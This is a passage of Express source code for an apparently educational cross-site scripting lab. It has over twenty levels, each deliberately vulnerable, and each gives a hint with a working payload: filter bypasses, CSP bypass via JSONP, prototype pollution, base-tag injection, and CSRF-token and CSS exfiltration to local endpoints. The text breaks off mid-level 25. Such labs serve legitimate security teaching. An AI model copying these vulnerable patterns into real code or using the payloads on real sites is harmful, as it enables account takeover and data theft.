  res.send(levelPage('Stored XSS Guestbook', 2, 'Easy',
    'None &mdash; input is stored and rendered without any sanitization.',
    'Just like Level 1, but your payload persists. Try putting a <code>&lt;script&gt;</code> tag in the message field.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Leave a message in the guestbook.</p>
    <form method="POST" action="/level/2">
      <input type="text" name="name" placeholder="Your name" style="max-width:200px;">
      <input type="text" name="message" placeholder="Your message" style="flex:2;">
      <button type="submit">Post</button>
    </form>
    <div style="margin-top:1rem;">${entries || '<p style="color:#484f58;">No entries yet.</p>'}</div>
    <form method="POST" action="/level/2/clear" style="margin-top:1rem;"><button type="submit" style="background:#da3633;border-color:#f85149;">Clear Guestbook</button></form>`));
});
app.post('/level/2', (req, res) => {
  const { name, message } = req.body;
  if (name && message) guestbook.push({ name, message });
  res.redirect('/level/2');
});
app.post('/level/2/clear', (req, res) => { guestbook.length = 0; res.redirect('/level/2'); });

// LEVEL 3
app.get('/level/3', (req, res) => {
  let q = req.query.q || '';
  q = q.replace(/<\/?script\b[^>]*>/gi, '');
  const output = q ? `<div class="output"><p>Result: ${q}</p></div>` : '';
  res.send(levelPage('Script Tag Blocked', 3, 'Medium',
    '<code>&lt;script&gt;</code> tags are stripped (case-insensitive regex).',
    'Try <code>&lt;img src=x onerror=alert("XSS")&gt;</code> or <code>&lt;svg onload=alert("XSS")&gt;</code>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">The server removes &lt;script&gt; tags. Find another vector.</p>
    <form method="GET"><input type="text" name="q" placeholder="Payload..."><button type="submit">Submit</button></form>
    ${output}`));
});

// LEVEL 4
app.get('/level/4', (req, res) => {
  const q = req.query.q || '';
  res.send(levelPage('Attribute Injection', 4, 'Medium',
    'Input is placed inside an HTML attribute value (double-quoted). No tag filtering.',
    'Your input is inside a <code>value="..."</code> attribute. Try: <code>" onfocus=alert("XSS") autofocus="</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">Your input is reflected into an input element\'s value attribute.</p>
    <form method="GET"><input type="text" name="q" placeholder="Type here..."><button type="submit">Submit</button></form>
    <div class="output" style="margin-top:1rem;">
      <p>Reflected element:</p>
      <input type="text" value="${q}" style="width:100%;padding:0.5rem;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;">
    </div>`));
});

// LEVEL 5
app.get('/level/5', (req, res) => {
  let q = req.query.q || '';
  q = q.replace(/</g, '&lt;').replace(/>/g, '&gt;');
  res.send(levelPage('JavaScript Context', 5, 'Medium',
    'Angle brackets <code>&lt; &gt;</code> are HTML-encoded. Your input lands inside a JS string literal.',
    'Close the string with <code>\'</code>, then inject code: <code>\';alert("XSS");//</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">Angle brackets are encoded. Your input is placed inside a JavaScript string.</p>
    <form method="GET"><input type="text" name="q" placeholder="Payload..."><button type="submit">Submit</button></form>
    <div class="output"><p>Check the page source to see where your input lands.</p></div>
    <script>var userData='${q}';document.querySelector('.output').innerHTML+='<p>User data: '+userData+'</p>';</script>`));
});

// LEVEL 6
app.get('/level/6', (req, res) => {
  let q = req.query.q || '';
  q = q.replace(/<\/?script\b[^>]*>/gi, '');
  q = q.replace(/\bon(error|load|click|mouseover|mouseout|focus|blur|input|change|submit|keydown|keyup|keypress)\s*=/gi, '');
  const output = q ? `<div class="output"><p>Result: ${q}</p></div>` : '';
  res.send(levelPage('Event Handler Blocklist', 6, 'Hard',
    '<code>&lt;script&gt;</code> stripped. Common event handlers (onerror, onload, onclick, onmouseover, onfocus, onblur, oninput, onchange, onsubmit, onkeydown, onkeyup, onkeypress) stripped.',
    'Try: <code>&lt;details open ontoggle=alert("XSS")&gt;&lt;summary&gt;X&lt;/summary&gt;&lt;/details&gt;</code> or <code>&lt;marquee onstart=alert("XSS")&gt;</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">Common event handlers are stripped. Find an obscure one.</p>
    <form method="GET"><input type="text" name="q" placeholder="Payload..."><button type="submit">Submit</button></form>
    ${output}`));
});

// LEVEL 7
app.get('/level/7', (req, res) => {
  let q = req.query.q || '';
  q = q.replace(/script/gi, '').replace(/alert/gi, '').replace(/onerror/gi, '').replace(/onload/gi, '')
    .replace(/onclick/gi, '').replace(/onfocus/gi, '').replace(/onmouseover/gi, '').replace(/javascript/gi, '')
    .replace(/eval/gi, '').replace(/prompt/gi, '').replace(/confirm/gi, '');
  const output = q ? `<div class="output"><p>Result: ${q}</p></div>` : '';
  res.send(levelPage('Case & Keyword Filter', 7, 'Hard',
    'Keywords stripped (single pass, case-insensitive): script, alert, onerror, onload, onclick, onfocus, onmouseover, javascript, eval, prompt, confirm.',
    'Single-pass strip. Nest keywords inside themselves: <code>onerronerrorr</code> → strip "onerror" → <code>onerror</code>. Try: <code>&lt;img src=x onerronerrorr=alalertert(1)&gt;</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">Dangerous keywords are stripped in a single pass. Can you reconstruct them?</p>
    <form method="GET"><input type="text" name="q" placeholder="Payload..."><button type="submit">Submit</button></form>
    ${output}`));
});

// LEVEL 8
app.get('/level/8', (req, res) => {
  res.send(levelPage('DOM-Based XSS', 8, 'Hard',
    'No server-side reflection. Vulnerability is in client-side JavaScript reading from <code>location.hash</code>.',
    'The JS reads <code>location.hash</code> and writes it to <code>innerHTML</code>. Navigate to <code>/level/8#&lt;img src=x onerror=alert("XSS")&gt;</code>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">No server reflection. The vulnerability is entirely client-side. Use the URL hash (#).</p>
    <div class="output" id="domOutput"><p style="color:#484f58;">Waiting for hash input...</p></div>
    <script>
      function renderHash(){
        var hash=decodeURIComponent(location.hash.substring(1));
        if(hash)document.getElementById('domOutput').innerHTML='<p>Welcome, '+hash+'!</p>';
      }
      window.addEventListener('hashchange',renderHash);
      renderHash();
    </script>`));
});

// LEVEL 9
app.get('/level/9', (req, res) => {
  let url = req.query.url || '';
  let filtered = url.replace(/<\/?script\b[^>]*>/gi, '').replace(/\bon\w+\s*=/gi, '');
  const blocked = /javascript:/i.test(filtered);
  const output = blocked
    ? `<div class="output"><p style="color:#f85149;">Blocked: "javascript:" protocol detected.</p></div>`
    : url ? `<div class="output"><p>Click the link: <a href="${filtered}">Visit Link</a></p></div>` : '';
  res.send(levelPage('href Injection with Filters', 9, 'Expert',
    '<code>&lt;script&gt;</code> stripped, event handlers stripped, <code>javascript:</code> protocol blocked.',
    'The filter checks the literal string "javascript:", but HTML entities in href are decoded by the browser first. Try: <code>&#106;avascript:alert(1)</code> or <code>java%09script:alert(1)</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">Provide a URL. The server blocks &lt;script&gt;, event handlers, and the javascript: protocol.</p>
    <form method="GET"><input type="text" name="url" placeholder="Enter URL..."><button type="submit">Create Link</button></form>
    ${output}`));
});

// LEVEL 10
app.get('/level/10', (req, res) => {
  const q = req.query.q || '';
  const nonce = Math.random().toString(36).substring(2, 15);
  const html = levelPage('CSP Bypass via JSONP', 10, 'Expert',
    `Content-Security-Policy: <code>script-src 'nonce-${nonce}' 'self'</code>. Only nonced scripts and same-origin scripts are allowed.`,
    'The CSP allows <code>\'self\'</code>. There is a JSONP endpoint at <code>/api/jsonp?callback=alert(1)//</code>. Load it as a same-origin script: <code>&lt;script src="/api/jsonp?callback=alert(1)//"&gt;&lt;/script&gt;</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">A CSP is in place. Explore <code>/api/jsonp?callback=myFunction</code>...</p>
    <form method="GET"><input type="text" name="q" placeholder="Payload..."><button type="submit">Submit</button></form>
    <div class="output">${q ? `<p>Result: ${q}</p>` : ''}</div>`);
  res.set('Content-Security-Policy', `script-src 'nonce-${nonce}' 'self'`);
  res.send(html.replace(/<script>/g, `<script nonce="${nonce}">`));
});
app.get('/api/jsonp', (req, res) => {
  const callback = req.query.callback || 'callback';
  res.type('application/javascript');
  res.send(`${callback}({"status":"ok"})`);
});

// LEVEL 11
app.get('/level/11', (req, res) => {
  const rawMatch = req.url.match(/[?&]q=([^&]*)/);
  const rawQ = rawMatch ? rawMatch[1] : '';
  let wafDecoded;
  try { wafDecoded = decodeURIComponent(rawQ); } catch (e) { wafDecoded = rawQ; }
  const blocked = /<\/?script\b[^>]*>/i.test(wafDecoded) || /\bon\w+\s*=/i.test(wafDecoded) || /javascript\s*:/i.test(wafDecoded);
  if (blocked) {
    res.send(levelPage('Double Encoding Bypass', 11, 'Expert',
      'A WAF decodes once and checks. The application decodes <strong>again</strong> before rendering.',
      'Type <code>%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code> in the form. The form adds one encoding layer, giving <code>%253C...</code> on the wire. WAF sees <code>%3C...</code> (safe), app decodes again to <code>&lt;...</code> (XSS).',
      `<p style="color:#8b949e;margin-bottom:1rem;">WAF blocked. Try to bypass it.</p>
      <form method="GET"><input type="text" name="q" placeholder="Payload..."><button type="submit">Submit</button></form>
      <div class="output"><p style="color:#f85149;">WAF Blocked: Dangerous pattern detected.</p></div>`));
    return;
  }
  let q;
  try { q = decodeURIComponent(wafDecoded); } catch (e) { q = wafDecoded; }
  const output = q ? `<div class="output"><p>Result: ${q}</p></div>` : '';
  res.send(levelPage('Double Encoding Bypass', 11, 'Expert',
    'A WAF decodes once and checks. The application decodes <strong>again</strong> before rendering.',
    'Type <code>%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code> in the form. The form adds one encoding layer, giving <code>%253C...</code> on the wire.',
    `<p style="color:#8b949e;margin-bottom:1rem;">WAF decodes once and scans. App decodes again before rendering. Sneak past the WAF.</p>
    <form method="GET"><input type="text" name="q" placeholder="Payload..."><button type="submit">Submit</button></form>
    ${output}`));
});

// LEVEL 12
app.get('/level/12', (req, res) => {
  const q = req.query.q || '';
  const stripped = q.replace(/<[^>]*>/g, '');
  res.send(levelPage('Client-Side Template Injection', 12, 'Expert',
    'All HTML tags are stripped server-side. The page uses a naive template engine that evaluates <code>{{expressions}}</code> via eval.',
    'No HTML tags, but the template engine uses eval. Try: <code>{{alert(1)}}</code> or <code>{{constructor.constructor("alert(1)")()}}</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">All HTML tags are stripped. A client-side template engine processes <code>{{...}}</code>.</p>
    <form method="GET"><input type="text" name="q" placeholder="Payload..."><button type="submit">Submit</button></form>
    <div class="output" id="templateOutput">${stripped}</div>
    <script>
      (function(){
        var el=document.getElementById('templateOutput');
        var html=el.innerHTML;
        html=html.replace(/\\{\\{(.+?)\\}\\}/g,function(m,expr){try{return eval(expr);}catch(e){return m;}});
        el.innerHTML=html;
      })();
    </script>`));
});

// LEVEL 13
app.get('/level/13', (req, res) => {
  res.send(levelPage('postMessage XSS', 13, 'Expert',
    'No server reflection. The page listens for <code>window.postMessage()</code> events without origin validation.',
    'Open the browser console and run: <code>window.postMessage("&lt;img src=x onerror=alert(1)&gt;","*")</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">No forms. Find the vulnerable message handler. Open DevTools Console (F12).</p>
    <div class="output" id="messageOutput"><p style="color:#484f58;">Waiting for messages...</p></div>
    <script>window.addEventListener('message',function(e){document.getElementById('messageOutput').innerHTML='<p>Received: '+e.data+'</p>';});</script>`));
});

// LEVEL 14
const uploadedSVGs = [];
app.get('/level/14', (req, res) => {
  const previews = uploadedSVGs.map(svg => `<div style="padding:1rem;border:1px solid #30363d;border-radius:8px;margin-bottom:0.5rem;background:#0d1117;">${svg}</div>`).join('');
  res.send(levelPage('SVG Upload XSS', 14, 'Expert',
    'File upload accepts SVG content. <code>&lt;script&gt;</code> tags stripped. SVGs rendered inline.',
    'Try: <code>&lt;svg onload=alert(1)&gt;&lt;/svg&gt;</code> or <code>&lt;svg&gt;&lt;rect width="100" height="100" onmouseover="alert(1)"/&gt;&lt;/svg&gt;</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">Upload SVG content. Script tags are stripped but SVGs support event handlers.</p>
    <form method="POST" action="/level/14">
      <textarea name="svg" rows="4" placeholder="Paste SVG markup..." style="width:100%;min-width:100%;"></textarea>
      <button type="submit">Upload SVG</button>
    </form>
    <div style="margin-top:1rem;">${previews || '<p style="color:#484f58;">No uploads yet.</p>'}</div>
    <form method="POST" action="/level/14/clear" style="margin-top:1rem;"><button type="submit" style="background:#da3633;border-color:#f85149;">Clear Uploads</button></form>`));
});
app.post('/level/14', (req, res) => {
  let svg = (req.body.svg || '').replace(/<\/?script\b[^>]*>/gi, '');
  if (svg) uploadedSVGs.push(svg);
  res.redirect('/level/14');
});
app.post('/level/14/clear', (req, res) => { uploadedSVGs.length = 0; res.redirect('/level/14'); });

// LEVEL 15
app.get('/level/15', (req, res) => {
  const q = req.query.q || '';
  res.send(levelPage('Mutation XSS', 15, 'Expert',
    'Client-side sanitizer uses DOMParser + querySelectorAll to strip scripts and event handlers. After insertion, &lt;template&gt; elements are instantiated.',
    'querySelectorAll does NOT pierce into &lt;template&gt; content. Try: <code>&lt;template&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/template&gt;</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">A sanitizer strips dangerous elements. The page instantiates &lt;template&gt; content afterward.</p>
    <form method="GET"><input type="text" name="q" placeholder="Payload..."><button type="submit">Submit</button></form>
    <div class="output" id="mxssOutput"></div>
    <script>
      (function(){
        var input=${JSON.stringify(q)};
        if(!input)return;
        var parser=new DOMParser();
        var doc=parser.parseFromString('<div>'+input+'</div>','text/html');
        var root=doc.body.firstChild;
        root.querySelectorAll('script').forEach(function(s){s.remove();});
        root.querySelectorAll('*').forEach(function(el){
          Array.from(el.attributes).forEach(function(attr){if(attr.name.startsWith('on'))el.removeAttribute(attr.name);});
        });
        var output=document.getElementById('mxssOutput');
        output.innerHTML=root.innerHTML;
        output.querySelectorAll('template').forEach(function(tmpl){
          var clone=document.importNode(tmpl.content,true);
          tmpl.parentNode.insertBefore(clone,tmpl);
          tmpl.remove();
        });
      })();
    </script>`));
});

// LEVEL 16
app.get('/level/16', (req, res) => {
  let q = req.query.q || '';
  let prev;
  do {
    prev = q;
    q = q.replace(/<\/?script\b[^>]*>/gi, '').replace(/\bon\w+\s*=/gi, '').replace(/javascript\s*:/gi, '')
      .replace(/alert/gi, '').replace(/eval/gi, '').replace(/prompt/gi, '').replace(/confirm/gi, '').replace(/Function/g, '');
  } while (q !== prev);
  const output = q ? `<div class="output"><p>Result: ${q}</p></div>` : '';
  res.send(levelPage('Recursive Keyword Filter', 16, 'Expert',
    'Filter loops until stable. Strips: &lt;script&gt;, on*=, javascript:, alert, eval, prompt, confirm, Function.',
    'Nesting is dead. Try: <code>&lt;iframe srcdoc="&amp;lt;img src=x onerror=&#x27;top[`al`+`ert`](1)&#x27;&amp;gt;"&gt;&lt;/iframe&gt;</code>. The srcdoc entities are decoded inside the iframe\'s own document context.',
    `<p style="color:#8b949e;margin-bottom:1rem;">The filter loops until clean. Think about context escapes.</p>
    <form method="GET"><input type="text" name="q" placeholder="Payload..."><button type="submit">Submit</button></form>
    ${output}`));
});

// LEVEL 17
app.get('/level/17', (req, res) => {
  let q = req.query.q || '';
  q = q.replace(/<\/?script\b[^>]*>/gi, '').replace(/"/g, '&quot;');
  res.send(levelPage('The Polyglot', 17, 'Expert',
    '<code>&lt;script&gt;</code> stripped. Double quotes HTML-encoded. Input appears in HTML body, attribute, and JS string simultaneously.',
    'Double quotes are encoded but single quotes are NOT. Focus on the JS string context: <code>\';alert(1)//</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">Input appears in 3 contexts. Find the weakest link. View source (Ctrl+U).</p>
    <form method="GET"><input type="text" name="q" placeholder="Payload..."><button type="submit">Submit</button></form>
    <div class="output">
      <p>HTML context: ${q}</p>
      <input type="hidden" name="data" value="${q}">
    </div>
    <script>var tracking='${q.replace(/\\/g, '\\\\').replace(/'/g, "\\'")}'; </script>
    <div class="output" style="margin-top:0.5rem;"><p style="color:#484f58;font-size:0.8rem;">Hint: View page source to see all three injection points.</p></div>`));
});

// LEVEL 18
app.get('/level/18', (req, res) => {
  const q = req.query.q || '';
  let filtered = q.replace(/<\/?script\b[^>]*>/gi, '').replace(/\bon\w+\s*=/gi, '').replace(/javascript\s*:/gi, '');
  res.send(levelPage('DOM Clobbering', 18, 'Expert',
    '<code>&lt;script&gt;</code> stripped, event handlers stripped, <code>javascript:</code> stripped. Page reads <code>window.config.href</code>.',
    'Inject <code>&lt;a id=config href="&amp;#106;avascript:alert(1)"&gt;x&lt;/a&gt;</code>. The server doesn\'t see "javascript:" — only the entity. The browser decodes it when resolving .href.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Page reads <code>window.config.href</code> to build a navigation link. Your HTML can overwrite <code>window.config</code>.</p>
    <form method="GET"><input type="text" name="q" placeholder="Payload..."><button type="submit">Submit</button></form>
    <div class="output" id="clobberOutput">${filtered}</div>
    <div id="widgetArea"></div>
    <script>
      (function(){
        var widget=document.getElementById('widgetArea');
        if(typeof window.config!=='undefined'&&window.config&&window.config.href){
          widget.innerHTML='<div style="padding:1rem;background:#0d1117;border:1px solid #30363d;border-radius:8px;margin-top:1rem;"><a href="'+window.config.href+'" style="color:#58a6ff;">Click here to continue &rarr;</a></div>';
        } else {
          widget.innerHTML='<div style="padding:1rem;background:#0d1117;border:1px solid #30363d;border-radius:8px;margin-top:1rem;color:#484f58;">No config loaded.</div>';
        }
      })();
    </script>`));
});

// LEVEL 19
app.get('/level/19', (req, res) => {
  const q = req.query.q || '';
  res.send(levelPage('Prototype Pollution → XSS', 19, 'Expert',
    'No direct HTML injection. JSON input is merged into a config object. A render function checks <code>config.html</code>.',
    'Submit: <code>{"__proto__":{"html":"&lt;img src=x onerror=alert(1)&gt;"}}</code>. This pollutes Object.prototype.html. The render function finds it via prototype chain.',
    `<p style="color:#8b949e;margin-bottom:1rem;">JSON input is deep-merged into a config object. No direct HTML injection — but the merge is dangerously naive.</p>
    <form method="GET"><input type="text" name="q" placeholder='{"key":"value"}'><button type="submit">Submit</button></form>
    <div class="output" id="ppOutput"><p style="color:#484f58;">Submit JSON to configure the widget.</p></div>
    <script>
      function merge(target,source){
        for(var key in source){
          if(typeof source[key]==='object'&&source[key]!==null&&!Array.isArray(source[key])){
            if(!target[key])target[key]={};
            merge(target[key],source[key]);
          } else { target[key]=source[key]; }
        }
        return target;
      }
      (function(){
        var input=${JSON.stringify(q)};
        if(!input)return;
        var config={title:'Widget'};
        try{var userObj=JSON.parse(input);merge(config,userObj);}catch(e){document.getElementById('ppOutput').innerHTML='<p style="color:#f85149;">Invalid JSON: '+e.message+'</p>';return;}
        var out=document.getElementById('ppOutput');
        out.innerHTML='<h3 style="color:#58a6ff;margin-bottom:0.5rem;">'+(config.title||'Widget')+'</h3>';
        if(config.html){out.innerHTML+=config.html;}else{out.innerHTML+='<p style="color:#8b949e;">Set "html" in config to customize.</p>';}
      })();
    </script>`));
});

// LEVEL 20
app.get('/level/20', (req, res) => {
  const q = req.query.q || '';
  let filtered = q.replace(/<\/?script\b[^>]*>/gi, '').replace(/\bon\w+\s*=/gi, '').replace(/javascript\s*:/gi, '');
  const nonce = Math.random().toString(36).substring(2, 15);
  const html = levelPage('Base Tag Injection', 20, 'Expert',
    'CSP: <code>script-src nonce self</code>. Scripts/handlers/javascript: stripped. Input injected <strong>before</strong> page scripts.',
    'Inject <code>&lt;base href="/evil/"&gt;</code>. The page loads <code>&lt;script src="level20-app.js"&gt;</code> relatively — it becomes <code>/evil/level20-app.js</code>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Input renders before the page's own scripts. The page loads a relative script. There's an endpoint at <code>/evil/</code>...</p>
    <form method="GET"><input type="text" name="q" placeholder="Payload..."><button type="submit">Submit</button></form>
    <div class="output">${filtered}</div>
    <script src="level20-app.js"></script>`);
  res.set('Content-Security-Policy', `script-src 'nonce-${nonce}' 'self'; base-uri *`);
  res.send(html.replace(/<script>/g, `<script nonce="${nonce}">`).replace(/<script src=/g, `<script nonce="${nonce}" src=`));
});
app.get('/level20-app.js', (req, res) => {
  res.type('application/javascript');
  res.send('document.querySelector(".output").innerHTML+="<p style=\\"color:#3fb950;\\">Legitimate app.js loaded.</p>";');
});
app.get('/evil/level20-app.js', (req, res) => {
  res.type('application/javascript');
  res.send('alert("XSS via base tag injection!")');
});

// LEVEL 21
app.get('/level/21', (req, res) => {
  const q = req.query.q || '';
  let filtered = q.replace(/<\/?script\b[^>]*>/gi, '').replace(/\bon\w+\s*=/gi, '').replace(/javascript\s*:/gi, '')
    .replace(/<\/?(?:base|iframe|object|embed)\b[^>]*>/gi, '');
  res.send(levelPage('Dangling Markup Injection', 21, 'Expert',
    'All execution vectors blocked. A CSRF token is hidden in the form. Exfiltrate it without JavaScript.',
    'Inject a <code>&lt;button formaction="/api/leak?"&gt;Update&lt;/button&gt;</code> inside the form. When clicked, the form submits to your endpoint with the CSRF token in the query string.',
    `<p style="color:#8b949e;margin-bottom:1rem;">All JS blocked. Exfiltrate the hidden CSRF token using only HTML injection.</p>
    <form method="GET"><input type="text" name="q" placeholder="Payload..."><button type="submit">Submit</button></form>
    <div class="output">
      <form action="/level/21" method="GET" id="profileForm">
        <p style="margin-bottom:0.75rem;">Bio: ${filtered}</p>
        <input type="hidden" name="csrf_token" value="SUPER_SECRET_TOKEN_abc123xyz">
        <button type="submit" style="background:#238636;color:#fff;border:none;padding:0.5rem 1rem;border-radius:6px;cursor:pointer;">Update Profile</button>
      </form>
    </div>
    <div id="leakStatus" style="margin-top:1rem;padding:1rem;background:#0d1117;border:1px solid #30363d;border-radius:8px;">
      <p style="color:#484f58;">Waiting for token exfiltration...</p>
    </div>
    <script>
      (function poll(){
        fetch('/api/leak-check').then(function(r){return r.json();}).then(function(d){
          if(d.leaked){document.getElementById('leakStatus').innerHTML='<p style="color:#3fb950;font-weight:600;">Token exfiltrated!</p>';alert('Token Exfiltrated!');}
          else{setTimeout(poll,1500);}
        }).catch(function(){setTimeout(poll,3000);});
      })();
    </script>`));
});
app.get('/api/leak', (req, res) => {
  const leaked = req.url.replace('/api/leak?', '');
  if (leaked.includes('SUPER_SECRET_TOKEN')) {
    level21Leaked = leaked;
    res.redirect('/level/21?q=&leaked=true');
  } else {
    res.send('No token found.');
  }
});
app.get('/api/leak-check', (req, res) => {
  if (level21Leaked) {
    const data = level21Leaked;
    level21Leaked = false;
    res.json({ leaked: true, data });
  } else {
    res.json({ leaked: false });
  }
});

// LEVEL 22
app.get('/level/22', (req, res) => {
  const q = req.query.q || '';
  const escaped = q.replace(/</g, '\\u003c').replace(/>/g, '\\u003e');
  const nonce = Math.random().toString(36).substring(2, 15);
  const html = levelPage('JSON Injection in Script Block', 22, 'Expert',
    'Input embedded in a JSON object inside a <code>&lt;script&gt;</code> block. Angle brackets Unicode-escaped. CSP nonce in place.',
    'Angle brackets are escaped but double quotes are NOT. Close the JSON string: <code>"-alert(1)-"</code> or <code>";alert(1);//</code>. You\'re already inside a trusted nonced script.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Your input is inside a JSON value in a trusted script block. Can you break out of the string?</p>
    <form method="GET"><input type="text" name="q" placeholder="Payload..."><button type="submit">Submit</button></form>
    <div class="output" id="jsonOutput"><p style="color:#484f58;">Submit a name.</p></div>
    <script>
      var appConfig={"name":"${escaped}","role":"user","theme":"dark"};
      document.getElementById('jsonOutput').innerHTML='<p>Config loaded: '+appConfig.name+' ('+appConfig.role+')</p>';
    </script>`);
  res.set('Content-Security-Policy', `script-src 'nonce-${nonce}' 'self'`);
  res.send(html.replace(/<script>/g, `<script nonce="${nonce}">`).replace(/<script src=/g, `<script nonce="${nonce}" src=`));
});

// LEVEL 23
app.get('/level/23', (req, res) => {
  const url = req.query.url || '';
  let filtered = url.replace(/<\/?script\b[^>]*>/gi, '').replace(/\bon\w+\s*=/gi, '');
  const jsBlocked = /javascript\s*:/i.test(filtered);
  if (jsBlocked) {
    res.send(levelPage('URL Scheme Bypass', 23, 'Expert',
      '<code>&lt;script&gt;</code> stripped, event handlers stripped, <code>javascript:</code> blocked.',
      'Encode any character of "javascript:" with HTML entities: <code>&amp;#106;avascript:alert(1)</code>. The server sees only entities; the browser decodes them before interpreting the URL.',
      `<p style="color:#8b949e;margin-bottom:1rem;">javascript: blocked. Encode around it.</p>
      <form method="GET"><input type="text" name="url" placeholder="URL..."><button type="submit">Submit</button></form>
      <div class="output"><p style="color:#f85149;">Blocked: javascript: protocol detected.</p></div>`));
    return;
  }
  res.send(levelPage('URL Scheme Bypass', 23, 'Expert',
    '<code>&lt;script&gt;</code> stripped, event handlers stripped, <code>javascript:</code> blocked.',
    'Encode any character of "javascript:" with HTML entities: <code>&amp;#106;avascript:alert(1)</code>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Provide a URL. The server blocks javascript: as a literal string. The browser decodes entities in href...</p>
    <form method="GET"><input type="text" name="url" placeholder="URL..."><button type="submit">Submit</button></form>
    ${url ? `<div class="output"><p>Click:</p><a href="${filtered}" style="color:#58a6ff;font-size:1.1rem;font-weight:600;">Visit Link &rarr;</a></div>` : '<div class="output"><p style="color:#484f58;">Enter a URL.</p></div>'}`));
});

// ============================================================
// LEVEL 24 — CSS Injection Exfiltration
// ============================================================
// In-memory store for the "stolen" token
let cssLeaked = false;

app.get('/level/24', (req, res) => {
  const css = req.query.css || '';
  // Defense: strip all script/event vectors — only CSS injection is possible
  let filteredCss = css
    .replace(/<[^>]*>/g, '')          // No HTML tags at all
    .replace(/javascript\s*:/gi, ''); // No javascript: in CSS expressions

  // Check if attacker exfiltrated the token via CSS url() requests
  // The token char-by-char is: T-O-K-E-N → "SECRET42"
  const secretToken = 'SECRET42';

  res.send(levelPage(
    'CSS Injection Exfiltration', 24, 'Expert',
    'All JavaScript vectors are blocked. You can only inject into a <code>&lt;style&gt;</code> block. A hidden element contains a secret token.',
    'Use CSS attribute selectors + <code>background-image:url()</code> to exfiltrate the token value. Example: <code>input[value^="S"]{background:url(/api/css-leak?c=S)}</code>. Send one request per character until the full token is revealed. The page polls for the leaked value.',
    `<p style="color:#8b949e;margin-bottom:1rem;">All JavaScript is blocked. Your input goes into a <code>&lt;style&gt;</code> block. A hidden input holds a secret token. Exfiltrate it using only CSS.</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: CSS Injection Data Exfiltration</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">CSS attribute selectors like <code>input[value^="A"]</code> match elements whose value starts with "A". By combining this with <code>background-image: url(//attacker/leak?c=A)</code>, the browser fires a network request only when the selector matches. An attacker iterates over all possible characters and observes which request is made — revealing the secret one character at a time. This is a purely CSS-based side-channel attack that requires zero JavaScript.</p>
    </div>
    <form method="GET">
      <input type="text" name="css" placeholder="CSS payload..." style="font-family:monospace;">
      <button type="submit">Inject CSS</button>
    </form>
    <!-- The injected CSS -->
    <style>${filteredCss}</style>
    <!-- The secret element — try to exfiltrate its value -->
    <input type="hidden" id="secretInput" value="${secretToken}" style="display:block;opacity:0;position:absolute;width:1px;height:1px;">
    <!-- Make it targetable by CSS (needs to be "visible" to trigger background loads) -->
    <div style="position:relative;height:0;overflow:hidden;">
      <input id="secretInput2" value="${secretToken}" style="position:absolute;opacity:0.001;width:1px;height:1px;pointer-events:none;" tabindex="-1" aria-hidden="true">
    </div>
    <div id="cssLeakStatus" style="margin-top:1rem;padding:1rem;background:#0d1117;border:1px solid #30363d;border-radius:8px;">
      <p style="color:#484f58;">Waiting for CSS-based exfiltration... Inject CSS that fires a request to <code>/api/css-leak?c=SECRET42</code></p>
    </div>
    <script>
      (function poll(){
        fetch('/api/css-leak-check').then(function(r){return r.json();}).then(function(d){
          if(d.leaked){
            document.getElementById('cssLeakStatus').innerHTML='<p style="color:#3fb950;font-weight:600;">Token exfiltrated via CSS! Value: '+d.value+'</p>';
            alert('CSS Exfiltration: '+d.value);
          } else { setTimeout(poll,1500); }
        }).catch(function(){setTimeout(poll,3000);});
      })();
    </script>`
  ));
});

app.get('/api/css-leak', (req, res) => {
  const c = req.query.c || '';
  if (c === 'SECRET42' || c.startsWith('SECRET')) {
    cssLeaked = c;
  }
  // Return a 1x1 transparent gif so browser doesn't error
  res.set('Content-Type', 'image/gif');
  res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
});

app.get('/api/css-leak-check', (req, res) => {
  if (cssLeaked) {
    const val = cssLeaked;
    cssLeaked = false;
    res.json({ leaked: true, value: val });
  } else {
    res.json({ leaked: false });
  }
});

// ============================================================
// LEVEL 25 — Open Redirect → XSS via meta-refresh
// ============================================================
app.get('/level/25', (req, res) => {
  const next = req.query.next || '';

  // Defense: block direct script/event injection in the URL — but not javascript: in meta-refresh
  const blocked = /<script/i.test(next) || /on\w+\s*=/i.test(next);

  if (blocked) {
    res.send(levelPage('Open Redirect → XSS', 25, 'Hard',
      'Redirect destination reflected into a meta-refresh tag. Script tags and event handlers blocked.',
      'The redirect URL goes into a meta-refresh <code>content="0;url=..."</code>. Try <code>javascript:alert(1)</code> — meta-refresh executes javascript: URLs in many browsers.',
      `<p style="color:#8b949e;margin-bottom:1rem;">Blocked! Try a different approach.</p>
      <form method="GET"><input type="text" name="next" placeholder="Redirect URL..."><button type="submit">Redirect</button></form>
      <div class="output"><p style="color:#f85149;">Blocked: dangerous pattern detected.</p></div>`));
    return;
  }

  if (!next) {
    res.send(levelPage('Open Redirect → XSS', 25, 'Hard',
      'Redirect destination reflected into a meta-refresh tag. Script tags and event handlers blocked.',
